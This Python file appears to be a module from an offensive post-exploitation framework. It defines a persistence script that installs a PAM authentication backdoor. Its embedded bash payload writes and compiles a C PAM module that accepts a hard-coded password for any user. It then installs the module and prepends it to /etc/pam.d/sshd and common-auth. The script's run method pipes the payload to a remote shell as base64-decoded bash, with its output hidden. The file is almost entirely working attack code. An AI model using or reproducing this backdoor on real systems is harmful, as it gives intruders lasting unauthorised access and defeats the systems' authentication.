"""PAM backdoor module script."""

from ..base import OperatorScript, ScriptResult


class PAMBackdoor(OperatorScript):
    """Install PAM backdoor for password bypass."""
    
    name = "PAM Backdoor"
    description = "Install PAM backdoor module"
    category = "persist"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] PAM BACKDOOR MODULE"
echo "======================"
echo ""

BACKDOOR_PASS="Sup3rS3cr3tP@ss"

echo "[+] Creating PAM backdoor module..."
cat > /tmp/pam_backdoor.c 2>/dev/null <<'EOFCODE'
#include <security/pam_modules.h>
#include <string.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
                                    int argc, const char **argv) {
    const char *password;
    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
    
    if (strcmp(password, "Sup3rS3cr3tP@ss") == 0) {
        return PAM_SUCCESS;
    }
    
    return PAM_AUTH_ERR;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags,
                               int argc, const char **argv) {
    return PAM_SUCCESS;
}
EOFCODE

echo "[+] Compiling PAM module..."
if command -v gcc &>/dev/null; then
    gcc -fPIC -shared -o /tmp/pam_backdoor.so /tmp/pam_backdoor.c -lpam 2>/dev/null && \
        echo "[+] Compilation successful" || \
        echo "[-] Compilation failed (need libpam-dev)"
    
    if [ -f /tmp/pam_backdoor.so ]; then
        cp /tmp/pam_backdoor.so /lib/x86_64-linux-gnu/security/ 2>/dev/null && \
            echo "[+] Module installed" || \
            echo "[-] Could not install module (need root)"
    fi
else
    echo "[-] gcc not available"
fi

echo ""
echo "[+] Configuring PAM to use backdoor..."
PAM_SSHD="/etc/pam.d/sshd"
PAM_COMMON="/etc/pam.d/common-auth"

if [ -f "$PAM_SSHD" ]; then
    sed -i '1i auth sufficient pam_backdoor.so' "$PAM_SSHD" 2>/dev/null && \
        echo "[+] Added to $PAM_SSHD" || \
        echo "[-] Could not modify $PAM_SSHD"
fi

if [ -f "$PAM_COMMON" ]; then
    sed -i '1i auth sufficient pam_backdoor.so' "$PAM_COMMON" 2>/dev/null && \
        echo "[+] Added to $PAM_COMMON" || \
        echo "[-] Could not modify $PAM_COMMON"
fi

echo ""
echo "[+] Verifying PAM configuration:"
grep pam_backdoor /etc/pam.d/* 2>/dev/null

echo ""
echo "[+] Backdoor credentials:"
echo "  Password: $BACKDOOR_PASS"
echo "  Works with any username"

echo ""
echo "[+] Testing backdoor:"
echo "  ssh anyuser@target_ip"
echo "  Password: $BACKDOOR_PASS"

echo ""
echo "[+] Cleanup:"
rm -f /tmp/pam_backdoor.c 2>/dev/null

echo ""
echo "[!] WARNING: PAM modifications are highly detectable"
echo "  - File integrity monitoring will alert"
echo "  - Unusual PAM config easily spotted"
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Installing PAM backdoor...[/bold cyan]")
            
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            
            return ScriptResult(
                success=True,
                output="PAM backdoor installation executed",
                metadata={"script": "pam_backdoor"}
            )
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
